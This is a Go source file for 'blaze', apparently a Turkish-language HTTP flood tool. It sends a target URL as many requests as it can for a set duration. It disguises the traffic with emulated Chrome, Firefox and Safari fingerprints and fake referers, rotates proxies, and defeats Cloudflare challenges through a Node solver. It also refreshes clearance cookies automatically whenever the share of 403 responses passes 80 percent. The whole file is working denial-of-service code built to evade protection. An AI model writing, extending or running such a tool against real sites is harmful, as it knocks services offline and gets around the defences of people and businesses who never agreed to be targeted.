package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve]")
		fmt.Println()
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET socks5://127.0.0.1:1080")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
		fmt.Println()
		fmt.Println("flaglar:")
		fmt.Println("  --solve    cloudflare challenge coz + auto-refresh (puppeteer-real-browser)")
		fmt.Println("             ilk kullanim: cd solver && npm install")
		fmt.Println()
		fmt.Println("proxy dosya formati (satir satir):")
		fmt.Println("  ip:port")
		fmt.Println("  ip:port:user:pass")
		fmt.Println("  socks5://ip:port")
		fmt.Println("  http://user:pass@ip:port")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	method := "GET"
	proxyArg := ""
	solve := false

	posArgs := []string{}
	for _, arg := range os.Args[4:] {
		if arg == "--solve" {
			solve = true
		} else {
			posArgs = append(posArgs, arg)
		}
	}
	if len(posArgs) >= 1 {
		streams = mustInt(posArgs[0], "stream")
	}
	if len(posArgs) >= 2 {
		method = strings.ToUpper(posArgs[1])
	}
	if len(posArgs) >= 3 {
		proxyArg = posArgs[2]
	}

	var solvedCookies string
	var solvedUA string
	if solve {
		var err error
		solvedCookies, solvedUA, err = solveCFChallenge(targetURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "hata: challenge cozulemedi: %v\n", err)
			os.Exit(1)
		}
	}

	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve)
}

// solverResult is the JSON output from solver/index.js
type solverResult struct {
	Status    string `json:"status"`
	URL       string `json:"url"`
	UserAgent string `json:"user_agent"`
	Cookies   string `json:"cookies"`
	Error     string `json:"error"`
}

// solveCFChallenge runs the Node.js solver to get cf_clearance cookie and user-agent.
func solveCFChallenge(targetURL string) (cookies string, userAgent string, err error) {
	fmt.Println("cloudflare challenge cozuluyor...")

	solverPath := findSolver()
	if solverPath == "" {
		return "", "", fmt.Errorf("solver/index.js bulunamadi. 'cd solver && npm install' calistirin")
	}

	if _, errStat := os.Stat("solver/node_modules"); os.IsNotExist(errStat) {
		return "", "", fmt.Errorf("solver/node_modules bulunamadi. 'cd solver && npm install' calistirin")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "node", solverPath, targetURL, "45")
	cmd.Stderr = os.Stderr
	output, errCmd := cmd.Output()
	if errCmd != nil {
		return "", "", fmt.Errorf("solver calistirilamadi: %w", errCmd)
	}

	var result solverResult
	if errJSON := json.Unmarshal(output, &result); errJSON != nil {
		return "", "", fmt.Errorf("solver ciktisi okunamadi: %w\ncikti: %s", errJSON, string(output))
	}

	if result.Status == "error" {
		return "", "", fmt.Errorf("solver hatasi: %s", result.Error)
	}

	if result.Cookies == "" {
		return "", "", fmt.Errorf("solver cookie dondurmedi (status: %s)", result.Status)
	}

	fmt.Printf("challenge cozuldu! status: %s\n", result.Status)
	if result.UserAgent != "" {
		fmt.Printf("user-agent: %s\n", result.UserAgent)
	}
	if result.Status == "no_clearance" {
		fmt.Println("uyari: cf_clearance cookie bulunamadi, mevcut cookie'ler kullanilacak")
	}

	return result.Cookies, result.UserAgent, nil
}

func findSolver() string {
	for _, p := range []string{"solver/index.js", "./solver/index.js"} {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

// cookieStore holds the current cookie string, updated atomically during refresh.
type cookieStore struct {
	mu      sync.RWMutex
	cookies string
}

func (cs *cookieStore) Get() string {
	cs.mu.RLock()
	defer cs.mu.RUnlock()
	return cs.cookies
}

func (cs *cookieStore) Set(c string) {
	cs.mu.Lock()
	cs.cookies = c
	cs.mu.Unlock()
}

// clientGroup holds multiple clients of the same browser type.
type clientGroup struct {
	name      string
	clients   []*gofire.Client
	pipelines []*gofire.Pipeline
	templates []*http.Request
}

func (cg *clientGroup) Close() {
	for _, p := range cg.pipelines {
		p.Close()
	}
	for _, c := range cg.clients {
		c.Close()
	}
}

func (cg *clientGroup) ActiveConnections() int64 {
	var total int64
	for _, c := range cg.clients {
		total += c.ActiveConnections()
	}
	return total
}

// updateCookies updates the Cookie header on all templates.
func (cg *clientGroup) updateCookies(newCookies string) {
	for _, tmpl := range cg.templates {
		tmpl.Header.Set("Cookie", newCookies)
	}
}

func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	totalTargetClients := threads
	if totalTargetClients > 40 {
		totalTargetClients = 40
	}
	if totalTargetClients < 10 {
		totalTargetClients = 10
	}

	idlePerHost := 256
	totalIdle := 1024

	baseOpts := []gofire.Option{
		gofire.WithTimeout(10 * time.Second),
		gofire.WithTLSHandshakeTimeout(8 * time.Second),
		gofire.WithDialTimeout(8 * time.Second),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(totalIdle),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithMaxRedirects(3),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
	}

	browserReferers := map[string]string{
		"safari":  "https://www.google.com/search?client=safari&channel=iphone_bm",
		"chrome":  "https://www.google.com/",
		"firefox": "https://duckduckgo.com/",
	}

	var proxyRotator *gofire.ProxyRotator
	if proxyArg != "" {
		if isProxyFile(proxyArg) {
			var err error
			proxyRotator, err = gofire.NewProxyRotatorFromFile(proxyArg)
			if err != nil {
				fmt.Fprintf(os.Stderr, "hata: proxy dosyasi yuklenemedi: %v\n", err)
				os.Exit(1)
			}
		} else {
			baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
		}
	}

	var parsedCookies []*http.Cookie
	if solvedCookies != "" {
		parsedCookies = parseCookieHeader(solvedCookies)
		fmt.Printf("cookie: %d adet yuklendi\n", len(parsedCookies))
	}

	type browserSpec struct {
		name    string
		profile gofire.BrowserProfile
		clients int
	}

	var browsers []browserSpec

	if solvedCookies != "" {
		browsers = []browserSpec{
			{"chrome", gofire.Chrome146, totalTargetClients},
		}
		if solvedUA != "" {
			baseOpts = append(baseOpts, gofire.WithUserAgent(solvedUA))
		}
		fmt.Printf("cf-bypass: tum clientlar chrome (solver UA ile)\n")
	} else {
		safariClients := totalTargetClients * 4 / 10
		chromeClients := totalTargetClients * 3 / 10
		firefoxClients := totalTargetClients - safariClients - chromeClients
		if safariClients < 2 {
			safariClients = 2
		}
		if chromeClients < 1 {
			chromeClients = 1
		}
		if firefoxClients < 1 {
			firefoxClients = 1
		}
		browsers = []browserSpec{
			{"firefox", gofire.Firefox148, firefoxClients},
			{"chrome", gofire.Chrome146, chromeClients},
			{"safari", gofire.SafariIOS18, safariClients},
		}
	}

	groups := make([]*clientGroup, len(browsers))

	totalClients := 0
	for _, bs := range browsers {
		totalClients += bs.clients
	}
	workersPerClient := (threads * streams) / totalClients
	if workersPerClient < 1 {
		workersPerClient = 1
	}

	for bi, bs := range browsers {
		cg := &clientGroup{name: bs.name}
		opts := append(baseOpts, gofire.WithReferer(browserReferers[bs.name]))

		for i := 0; i < bs.clients; i++ {
			c, err := gofire.Emulate(bs.profile, opts...)
			if err != nil {
				fmt.Fprintf(os.Stderr, "hata: %s client[%d] olusturulamadi: %v\n", bs.name, i, err)
				os.Exit(1)
			}
			if proxyRotator != nil {
				c.SetProxyRotator(proxyRotator)
			}
			if len(parsedCookies) > 0 {
				_ = c.SetCookies(targetURL, parsedCookies)
			}
			tmpl, err := c.PrepareRequest(method, targetURL)
			if err != nil {
				fmt.Fprintf(os.Stderr, "hata: %s template olusturulamadi: %v\n", bs.name, err)
				os.Exit(1)
			}
			if solvedCookies != "" {
				tmpl.Header.Set("Cookie", solvedCookies)
			}
			p := c.NewPipeline(workersPerClient)
			p.SetTemplate(tmpl)
			cg.clients = append(cg.clients, c)
			cg.pipelines = append(cg.pipelines, p)
			cg.templates = append(cg.templates, tmpl)
		}
		groups[bi] = cg
	}
	defer func() {
		for _, cg := range groups {
			cg.Close()
		}
	}()

	actualWorkers := workersPerClient * totalClients
	fmt.Printf("hedef: %s | sure: %ds | worker: %d (%d/client) | method: %s\n",
		targetURL, durSec, actualWorkers, workersPerClient, method)
	if solvedCookies != "" {
		fmt.Printf("browser: %d chrome client (cf-bypass mode, toplam %d baglanti)\n",
			totalClients, totalClients)
		if solveEnabled {
			fmt.Println("auto-refresh: aktif (403 orani >%80 olunca cookie yenilenir)")
		}
	} else {
		var bCounts []string
		for _, bs := range browsers {
			bCounts = append(bCounts, fmt.Sprintf("%d %s", bs.clients, bs.name))
		}
		fmt.Printf("browser: %s (toplam %d baglanti)\n",
			strings.Join(bCounts, " + "), totalClients)
	}
	if proxyRotator != nil {
		fmt.Printf("proxy: %d adet (rotate)\n", proxyRotator.Count())
	} else if proxyArg != "" {
		fmt.Printf("proxy: %s\n", proxyArg)
	}

	// Test one client per browser
	for _, cg := range groups {
		fmt.Printf("test [%s]... ", cg.name)
		testCtx, testCancel := context.WithTimeout(context.Background(), 15*time.Second)
		resp, testErr := cg.clients[0].DoWithContext(testCtx, method, targetURL, nil, nil)
		testCancel()
		if testErr != nil {
			fmt.Printf("BASARISIZ: %v\n", testErr)
		} else {
			fmt.Printf("OK %d\n", resp.StatusCode())
			resp.Close()
		}
	}

	// Pre-warm
	fmt.Print("baglanti isitiliyor... ")
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
	for _, cg := range groups {
		for _, c := range cg.clients {
			_ = c.PreConnect(warmCtx, targetURL, 4)
		}
	}
	warmCancel()

	var totalConns int64
	for _, cg := range groups {
		totalConns += cg.ActiveConnections()
	}
	fmt.Printf("%d baglanti\n", totalConns)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Println("\ndurduruluyor...")
		cancel()
	}()

	var (
		totalSent    atomic.Int64
		totalSuccess atomic.Int64
		totalFailed  atomic.Int64
		statusCodes  sync.Map
		errMu        sync.Mutex
		recentErrs   []string
		errCountMap  sync.Map
	)

	// 403 tracking for auto-refresh
	var recent403 atomic.Int64
	var recentTotal atomic.Int64
	// refreshing flag prevents multiple concurrent refreshes
	var refreshing atomic.Bool

	startTime := time.Now()
	fmt.Printf("basliyor... %d worker x %d client\n\n", actualWorkers, totalClients)

	onResult := func(resp *gofire.Response, err error, latency time.Duration) {
		totalSent.Add(1)
		if err != nil {
			totalFailed.Add(1)

			errStr := err.Error()
			if len(errStr) > 200 {
				errStr = errStr[:200]
			}
			if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
				errMu.Lock()
				if len(recentErrs) < 5 {
					recentErrs = append(recentErrs, errStr)
				}
				errMu.Unlock()
			}
			if val, ok := errCountMap.Load(errStr); ok {
				val.(*atomic.Int64).Add(1)
			}
		} else {
			totalSuccess.Add(1)
			if resp != nil {
				sc := resp.StatusCode()
				val, _ := statusCodes.LoadOrStore(sc, &atomic.Int64{})
				val.(*atomic.Int64).Add(1)

				// Track 403 for auto-refresh
				recentTotal.Add(1)
				if sc == 403 {
					recent403.Add(1)
				}
			}
		}
	}

	for _, cg := range groups {
		for _, p := range cg.pipelines {
			p.OnResult = onResult
		}
	}

	var feedWg sync.WaitGroup
	feedPipeline := func(pipeline *gofire.Pipeline) {
		defer feedWg.Done()
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			pipeline.FireAndForget(ctx, method, targetURL, nil, nil)
		}
	}

	feedersPerPipeline := 4
	for _, cg := range groups {
		for _, p := range cg.pipelines {
			for i := 0; i < feedersPerPipeline; i++ {
				feedWg.Add(1)
				go feedPipeline(p)
			}
		}
	}

	// Auto-refresh goroutine: checks 403 rate every 5 seconds
	if solveEnabled {
		go func() {
			ticker := time.NewTicker(5 * time.Second)
			defer ticker.Stop()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					total := recentTotal.Load()
					count403 := recent403.Load()

					// Reset counters for next window
					recentTotal.Store(0)
					recent403.Store(0)

					// Need at least 50 responses to judge
					if total < 50 {
						continue
					}

					rate := float64(count403) / float64(total)
					if rate < 0.80 {
						continue
					}

					// 403 rate > 80% → cookie expired, refresh
					if !refreshing.CompareAndSwap(false, true) {
						continue // another refresh already in progress
					}

					fmt.Printf("\n[auto-refresh] 403 orani: %.0f%% (%d/%d) - cookie yenileniyor...\n",
						rate*100, count403, total)

					newCookies, _, errSolve := solveCFChallenge(targetURL)
					if errSolve != nil {
						fmt.Printf("[auto-refresh] BASARISIZ: %v\n", errSolve)
						refreshing.Store(false)
						continue
					}

					// Update cookies on all templates (live, no restart needed)
					for _, cg := range groups {
						cg.updateCookies(newCookies)
					}

					fmt.Printf("[auto-refresh] cookie yenilendi! devam ediliyor...\n")
					refreshing.Store(false)
				}
			}
		}()
	}

	// Stats printer
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastSent int64
		var peakRPS int64

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				sent := totalSent.Load()
				ok := totalSuccess.Load()
				fail := totalFailed.Load()
				elapsed := time.Since(startTime).Seconds()

				rps := sent - lastSent
				lastSent = sent
				if rps > peakRPS {
					peakRPS = rps
				}

				var conns int64
				for _, cg := range groups {
					conns += cg.ActiveConnections()
				}

				fmt.Printf("\rsent:%d ok:%d fail:%d rps:%d peak:%d conn:%d %.0fs   ",
					sent, ok, fail, rps, peakRPS, conns, elapsed)
			}
		}
	}()

	feedWg.Wait()

	totalDuration := time.Since(startTime)
	sent := totalSent.Load()
	ok := totalSuccess.Load()
	fail := totalFailed.Load()

	avgRPS := float64(0)
	if totalDuration.Seconds() > 0 {
		avgRPS = float64(sent) / totalDuration.Seconds()
	}
	successRate := float64(0)
	if sent > 0 {
		successRate = float64(ok) / float64(sent) * 100
	}

	var finalConns int64
	for _, cg := range groups {
		finalConns += cg.ActiveConnections()
	}

	fmt.Printf("\n\n--- sonuclar ---\n")
	fmt.Printf("gonderilen: %d\n", sent)
	fmt.Printf("basarili:   %d (%%%.1f)\n", ok, successRate)
	fmt.Printf("basarisiz:  %d\n", fail)
	fmt.Printf("sure:       %v\n", totalDuration.Round(time.Millisecond))
	fmt.Printf("ort. rps:   %.0f req/s\n", avgRPS)
	fmt.Printf("baglanti:   %d (%d client)\n", finalConns, totalClients)

	hasStatus := false
	statusCodes.Range(func(key, value interface{}) bool {
		if !hasStatus {
			fmt.Println("\nstatus kodlari:")
			hasStatus = true
		}
		fmt.Printf("  %d: %d\n", key.(int), value.(*atomic.Int64).Load())
		return true
	})

	errMu.Lock()
	if len(recentErrs) > 0 {
		fmt.Println("\nhatalar:")
		for _, e := range recentErrs {
			count := int64(0)
			if val, ok := errCountMap.Load(e); ok {
				count = val.(*atomic.Int64).Load()
			}
			fmt.Printf("  [%dx] %s\n", count, e)
		}
	}
	errMu.Unlock()

	fmt.Println()
}

// parseCookieHeader parses a "name=value; name2=value2" string into []*http.Cookie.
func parseCookieHeader(raw string) []*http.Cookie {
	header := http.Header{}
	header.Add("Cookie", raw)
	req := http.Request{Header: header}
	return req.Cookies()
}

func isProxyFile(s string) bool {
	if strings.Contains(s, "://") {
		return false
	}
	if _, err := os.Stat(s); err == nil {
		return true
	}
	if strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv") {
		return true
	}
	return false
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "hata: gecersiz %s: %s\n", name, s)
		os.Exit(1)
	}
	return v
}
